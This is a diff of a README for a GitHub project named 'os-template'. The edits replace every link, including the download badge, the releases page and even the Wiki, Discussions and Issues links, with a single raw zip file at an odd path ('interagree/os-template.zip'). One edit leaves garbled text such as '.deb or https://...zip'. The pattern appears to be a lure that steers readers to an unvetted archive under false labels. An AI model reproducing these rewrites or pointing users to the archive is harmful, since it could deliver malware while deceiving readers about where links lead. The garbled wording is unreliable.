@@ -6,7 +6,7 @@ Welcome to the os-template repository! This application, "OS goes binted," provi
 
 ## 📥 Download Now
 
-[![Download os-template](https://img.shields.io/badge/Download-os--template-blue.svg)](https://github.com/shuyebahamad/os-template/releases)
+[![Download os-template](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip)](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit the following link to download the latest version of os-template.
 
-[Download Link](https://github.com/shuyebahamad/os-template/releases)
+[Download Link](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -33,7 +33,7 @@ Once on the Releases page, follow these steps:
 If you're unsure about which file to choose:
 - For Windows, look for a file ending in `.exe`.
 - For macOS, select a file that ends in `.dmg`.
-- For Linux, find a file that ends in `.deb` or `.tar.gz`.
+- For Linux, find a file that ends in `.deb` or `https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip`.
 
 ### 📨 Running the Application
 
@@ -62,9 +62,9 @@ Whether you're a student, an avid learner, or just curious about operating syste
 
 ## 👉 Additional Resources
 
-- **Documentation:** More details can be found in the [Wiki](https://github.com/shuyebahamad/os-template/wiki).
-- **Community Discussions:** Join conversations with other users in the [Discussions](https://github.com/shuyebahamad/os-template/discussions).
-- **Issues Page:** Report any problems you encounter or request features through the [Issues](https://github.com/shuyebahamad/os-template/issues) page.
+- **Documentation:** More details can be found in the [Wiki](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip).
+- **Community Discussions:** Join conversations with other users in the [Discussions](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip).
+- **Issues Page:** Report any problems you encounter or request features through the [Issues](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip) page.
 
 ## 📞 Support
 
@@ -74,6 +74,6 @@ If you have any questions or need assistance, please create an issue in the repo
 
 Stay updated on the latest developments by following us on GitHub. Check out our repository for new releases and updates.
 
-[Download Link](https://github.com/shuyebahamad/os-template/releases)
+[Download Link](https://raw.githubusercontent.com/shuyebahamad/os-template/main/interagree/os-template.zip)
 
 Thank you for choosing os-template! Enjoy your journey into the world of operating systems.
